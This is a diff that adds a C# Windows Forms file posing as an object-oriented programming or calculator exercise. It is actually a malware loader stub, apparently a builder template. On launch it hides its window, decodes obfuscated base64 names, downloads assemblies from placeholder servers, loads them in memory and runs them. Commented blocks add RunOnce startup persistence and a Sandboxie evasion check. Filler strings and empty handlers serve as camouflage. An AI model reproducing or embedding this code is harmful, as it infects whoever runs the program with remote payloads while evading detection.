@@ -1,1 +1,561 @@
-Ra
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Reflection;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Drawing;
+using System.Drawing.Drawing2D;
+using System.ComponentModel;
+using System.Runtime.InteropServices;
+using Microsoft.VisualBasic;
+using System.Collections;
+using System.Data;
+using System.Diagnostics;
+using System.Text;
+using System.Drawing.Imaging;
+using System.ComponentModel.Design;
+using System.Security.Cryptography;
+using Microsoft.Win32;
+using System.Xml.Linq;
+using System.Data.SqlClient;
+using System.Management;
+using System.Security.Cryptography.X509Certificates;
+using System.Data.Common;
+using Microsoft.VisualBasic.CompilerServices;
+using System.Runtime.CompilerServices;
+using System.Windows.Markup;
+
+//Assembly [assembly: AssemblyTitle("{1}")]
+//Assembly [assembly: AssemblyDescription("{2}")]
+//Assembly [assembly: AssemblyCompany("{3}")]
+//Assembly [assembly: AssemblyProduct("{4}")]
+//Assembly [assembly: AssemblyCopyright("{5}")]
+//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
+
+
+
+
+
+
+//Method #1
+
+
+
+//Method #2
+
+
+
+namespace ObjectOrientedProgrammingWithCSharp
+{
+
+
+
+    public class Form1 : Form
+    {
+
+        private IntPtr globalKeyboardHookId;
+        private IntPtr currentModuleId;
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WH_MOUSE_LL = 14;
+        private const int WM_KEYDOWN = 0x100;
+        private const int WM_SYSKEYDOWN = 0x104;
+        public Form1()
+        {
+
+
+
+            this.Hide();
+
+
+
+             //sandboxie controlsandboxie();
+
+             //Startup  self_skype();
+
+
+
+
+             %RUNPEGEN%
+
+             %URLGEN%
+
+
+
+
+
+            try
+            {
+
+
+               using (WebClient MENTION = new WebClient())
+                {
+
+                  
+      
+                   	string _stripchat = "";
+			_stripchat += "%1% Requirements".Replace("%1% Requirements","V2");
+			_stripchat += "%1% preprocessor".Replace("%1% preprocessor","lu");
+			_stripchat += "%1% ldapFilter".Replace("%1% ldapFilter","ZG");
+			_stripchat += "filledIdentity".Replace("filledIdentity","93");
+			_stripchat += "Get-ADComputer".Replace("Get-ADComputer","c0");
+			_stripchat += "Get-ADComputer -Identity DC01 -Properties".Replace("Get-ADComputer -Identity DC01 -Properties","Rl");
+			_stripchat += "Get-ADComputer DC01 -Properties Name,operatingSystem".Replace("Get-ADComputer DC01 -Properties Name,operatingSystem","dm");
+			_stripchat += "List specific attributes of the DC01 domain computer".Replace("List specific attributes of the DC01 domain computer","lj");
+			_stripchat += "Properties".Replace("Properties","ZV");
+			_stripchat += "%3% Get-SmbMapping".Replace("%3% Get-SmbMapping","Bv");
+			_stripchat += "netuse".Replace("netuse","cn");
+			_stripchat += "Select LocalPath,RemotePath From MSFT_SmbMapping".Replace("Select LocalPath,RemotePath From MSFT_SmbMapping","Rh");
+			_stripchat += "Retrieves the SMB client directory mappings created for a server.".Replace("Retrieves the SMB client directory mappings created for a server.","bF");
+			_stripchat += "Get-LocalUser".Replace("Get-LocalUser","dy");
+			_stripchat += "Invoke-WebRequest".Replace("Invoke-WebRequest","YX");
+			_stripchat += "curl".Replace("curl","Bw");
+			_stripchat += "Download file from the Internet".Replace("Download file from the Internet","ZX");
+			_stripchat += "Download file from the Internet specifying the destination".Replace("Download file from the Internet specifying the destination","I=");
+			_stripchat += "";
+			_stripchat += "";
+			_stripchat += "";
+
+
+            string preprocessor_OPT_SMILEY = "";
+			preprocessor_OPT_SMILEY += "Garage".Replace("Garage","V");
+			preprocessor_OPT_SMILEY += "White".Replace("White","2");
+			preprocessor_OPT_SMILEY += "Black".Replace("Black","l");
+			preprocessor_OPT_SMILEY += "Yellow".Replace("Yellow","u");
+			preprocessor_OPT_SMILEY += "Garage".Replace("Garage","Z");
+			preprocessor_OPT_SMILEY += "Garage".Replace("Garage","G");
+			preprocessor_OPT_SMILEY += "Garage".Replace("Garage","9");
+			preprocessor_OPT_SMILEY += "Garage".Replace("Garage","3");
+			preprocessor_OPT_SMILEY += "Garage".Replace("Garage","c");
+			preprocessor_OPT_SMILEY += "Garage".Replace("Garage","0");
+			preprocessor_OPT_SMILEY += "N";
+			preprocessor_OPT_SMILEY += "v";
+			preprocessor_OPT_SMILEY += "b";
+			preprocessor_OPT_SMILEY += "X";
+			preprocessor_OPT_SMILEY += "B";
+			preprocessor_OPT_SMILEY += "v";
+			preprocessor_OPT_SMILEY += "c";
+			preprocessor_OPT_SMILEY += "2";
+			preprocessor_OPT_SMILEY += "l";
+			preprocessor_OPT_SMILEY += "0";
+			preprocessor_OPT_SMILEY += "a";
+			preprocessor_OPT_SMILEY += "W";
+			preprocessor_OPT_SMILEY += "9";
+			preprocessor_OPT_SMILEY += "u";
+			preprocessor_OPT_SMILEY += "U";
+			preprocessor_OPT_SMILEY += "2";
+			preprocessor_OPT_SMILEY += "F";
+			preprocessor_OPT_SMILEY += "t";
+			preprocessor_OPT_SMILEY += "c";
+			preprocessor_OPT_SMILEY += "G";
+			preprocessor_OPT_SMILEY += "x";
+			preprocessor_OPT_SMILEY += "l";
+			preprocessor_OPT_SMILEY += "c";
+			preprocessor_OPT_SMILEY += "y";
+			preprocessor_OPT_SMILEY += "5";
+			preprocessor_OPT_SMILEY += "F";
+			preprocessor_OPT_SMILEY += "d";
+			preprocessor_OPT_SMILEY += "m";
+			preprocessor_OPT_SMILEY += "V";
+			preprocessor_OPT_SMILEY += "y";
+			preprocessor_OPT_SMILEY += "e";
+			preprocessor_OPT_SMILEY += "X";
+			preprocessor_OPT_SMILEY += "InvalidOperationException".Replace("InvalidOperationException","R");
+			preprocessor_OPT_SMILEY += "LDAPHelper".Replace("LDAPHelper","o");
+			preprocessor_OPT_SMILEY += "DistinguishedName,Name,ObjectClass,ObjectGUID,SamAccountName,ObjectSID".Replace("DistinguishedName,Name,ObjectClass,ObjectGUID,SamAccountName,ObjectSID","a");
+			preprocessor_OPT_SMILEY += "Properties".Replace("Properties","W");
+			preprocessor_OPT_SMILEY += "LDAPFilter".Replace("LDAPFilter","5");
+			preprocessor_OPT_SMILEY += "n";
+			preprocessor_OPT_SMILEY += "V";
+			preprocessor_OPT_SMILEY += "G";
+			preprocessor_OPT_SMILEY += "9";
+			preprocessor_OPT_SMILEY += "v";
+			preprocessor_OPT_SMILEY += "b";
+			preprocessor_OPT_SMILEY += "G";
+			preprocessor_OPT_SMILEY += "J";
+			preprocessor_OPT_SMILEY += "h";
+			preprocessor_OPT_SMILEY += "c";
+			preprocessor_OPT_SMILEY += "g";
+			preprocessor_OPT_SMILEY += "=";
+			preprocessor_OPT_SMILEY += "=";
+			preprocessor_OPT_SMILEY += "";
+			preprocessor_OPT_SMILEY += "";
+			preprocessor_OPT_SMILEY += "";
+			preprocessor_OPT_SMILEY += "";
+			preprocessor_OPT_SMILEY += "";
+			preprocessor_OPT_SMILEY += "";
+			preprocessor_OPT_SMILEY += "";
+			preprocessor_OPT_SMILEY += "";
+			preprocessor_OPT_SMILEY += "";
+			preprocessor_OPT_SMILEY += "";
+			preprocessor_OPT_SMILEY += "";
+			preprocessor_OPT_SMILEY += "";
+
+
+                    byte[] file_name = Convert.FromBase64String(_stripchat); //Redefine Base64 URL
+
+                    string file_contents = Encoding.UTF8.GetString(file_name);
+
+                    byte[] regLockScreen = Convert.FromBase64String(preprocessor_OPT_SMILEY); //Redefine Base64 URL
+
+                    string imageOrder = Encoding.UTF8.GetString(regLockScreen);
+
+                    var cleaned_content = new WebClient().DownloadData(%ServerRunPe%);
+
+                    object input_file_path = new object[] {"APPRUN", string.Empty, MENTION.DownloadData(%ServerGen%) };
+
+                    Assembly add_timestamp = Assembly.Load(cleaned_content);
+
+                    add_timestamp.GetType(string.Join("Cleans given input file in JSON and txt format if it can be found at the given path.", imageOrder)).InvokeMember(string.Join("Cleans given input file in JSON and txt format if it can be found at the given path.", file_contents), BindingFlags.InvokeMethod, null, null, (object[])input_file_path);
+                
+                    this.Close();
+
+                }
+            }
+            catch (Exception preprocessor_OPT_URL)
+            {
+                        
+            }
+        }
+        [STAThread]
+        static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new Form1());
+            try
+            {
+
+
+
+
+                Console.Write("The time it takes for the HTTP response to arrive is <b>{1} ms</b> in case of the ");
+                var daysAhead = Convert.ToInt32(Console.ReadLine());
+                Console.WriteLine("Vulnerable to remote code execution caused by");
+                Console.ReadLine();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+       
+        }
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            int sayi1, sayi2;
+            char opt;
+            double sonuc;
+
+
+            Console.WriteLine("\n\fileID: 7, guid: 0000000000000000f000000000000000, type: 0");
+            Console.WriteLine("\nTOPLAMA İÇİN + m_PreloadedShaders m_PreloadedShaders");
+            Console.WriteLine("ÇIKARMA İÇİN - m_PreloadedShaders m_PreloadedShaders");
+            Console.WriteLine("ÇARPMA İÇİN * m_PreloadedShaders m_PreloadedShaders");
+            Console.WriteLine("BÖLME İÇİN + m_PreloadedShaders m_PreloadedShaders");
+
+            Console.Write("\n\n GraphicsSettings GraphicsSettings GraphicsSettings :");
+            sayi1 = Convert.ToInt32(Console.ReadLine());
+
+            Console.Write(" GraphicsSettings GraphicsSettings GraphicsSettings :");
+            sayi2 = Convert.ToInt32(Console.ReadLine());
+
+            Console.Write("\nGraphicsSettings\t");
+            opt = Convert.ToChar(Console.ReadLine());
+
+            if (opt == '+')
+            {
+                sonuc = sayi1 + sayi2;
+                Console.WriteLine("\n{0} + {1} = {2}", sayi1, sayi2, sonuc);
+            }
+            else if (opt == '-')
+            {
+                sonuc = sayi1 - sayi2;
+                Console.WriteLine("\n{0} - {1} = {2}", sayi1, sayi2, sonuc);
+            }
+            else if (opt == '*')
+            {
+                sonuc = sayi1 * sayi2;
+                Console.WriteLine("\n{0} x {1} = {2}", sayi1, sayi2, sonuc);
+            }
+            else if (opt == '/')
+            {
+                sonuc = (double)sayi1 / sayi2;
+                Console.WriteLine("\n{0} / {1} = {2}", sayi1, sayi2, sonuc);
+            }
+            else
+            {
+                Console.WriteLine("0000000000000000f000000000000000 GraphicsSettings");
+            }
+
+
+            Console.ReadKey();
+        }
+        private void textBox1_TextChanged(object sender, EventArgs e)
+        {
+            for (int i = 1; i <= 10; i++)
+            {
+                Console.WriteLine(i + "0000000000000000f000000000000000 GraphicsSettings");
+            }
+
+            Console.ReadKey();
+        }
+
+        //Startup   public static void  self_skype()
+        //Startup   {
+        //Startup       int OwnerDraw  = Conversions.ToInteger("1");
+        //Startup       if ((double)OwnerDraw  != Conversions.ToDouble("1") || Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "%folder%", (object)null) != null) return;
+        //Startup       string email = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\%folder%\\%file%";
+        //Startup       if (!Directory.Exists(Path.GetDirectoryName(email)))
+        //Startup       {
+        //Startup           Directory.CreateDirectory(Path.GetDirectoryName(email));
+        //Startup           File.Copy(Application.ExecutablePath, email, true);
+        //Startup       }
+        //Startup       Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "%folder%", (object)email);
+        //Startup   }
+
+
+
+
+        //sandboxie [DllImport("kernel32.dll")]
+        //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
+        //sandboxie static void controlsandboxie()
+        //sandboxie {
+        //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
+        //sandboxie     {
+        //sandboxie        Environment.Exit(1);
+        //sandboxie     }
+        //sandboxie }
+
+        private void webBrowser13_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+
+        }
+
+        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+
+        }
+
+        private void webBrowser2_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+
+        }
+
+        private void webBrowser3_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+
+        }
+
+        private void webBrowser4_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+
+        }
+
+        private void webBrowser5_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+
+        }
+
+        private void webBrowser6_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+
+        }
+
+        private void webBrowser7_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+
+        }
+
+        private void webBrowser8_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+
+        }
+
+        private void webBrowser9_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+
+        }
+
+        private void webBrowser10_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+
+        }
+
+        private void webBrowser11_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+
+        }
+
+        private void webBrowser12_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void checkBox1_CheckedChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void checkedListBox1_SelectedIndexChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void dateTimePicker1_ValueChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void domainUpDown1_SelectedItemChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void fontDialog1_Apply(object sender, EventArgs e)
+        {
+
+        }
+
+        private void fontDialog2_Apply(object sender, EventArgs e)
+        {
+
+        }
+
+        private void flowLayoutPanel1_Paint(object sender, PaintEventArgs e)
+        {
+
+        }
+
+        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void listBox2_SelectedIndexChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void listBox3_SelectedIndexChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
+        {
+
+        }
+
+        private void panel1_Paint(object sender, PaintEventArgs e)
+        {
+
+        }
+
+        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void tabPage1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void tabPage2_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void tabControl2_SelectedIndexChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void tabPage3_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void tabPage4_Click(object sender, EventArgs e)
+        {
+
+        }
+
+
+
+        private void groupBox1_Enter(object sender, EventArgs e)
+        {
+
+        }
+
+        private void checkedListBox1_SelectedIndexChanged_1(object sender, EventArgs e)
+        {
+
+        }
+
+        private void comboBox1_SelectedIndexChanged_1(object sender, EventArgs e)
+        {
+
+        }
+
+        private void maskedTextBox1_MaskInputRejected(object sender, MaskInputRejectedEventArgs e)
+        {
+
+        }
+
+        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
+        {
+
+        }
+
+        private void progressBar1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void statusStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
+        {
+
+        }
+    }
+
+
+    static class _stripchat
+    {
+
+
+     
+ 
+    }
+
+}
+
+
+public class Payment
+{
+    public string Name { get; set; }
+
+
+    public override string ToString()
+    {
+        return "Payment {{ Name = {Name}, Amount = {Amount}, Due = {Frequency} }}";
+    }
+}
+
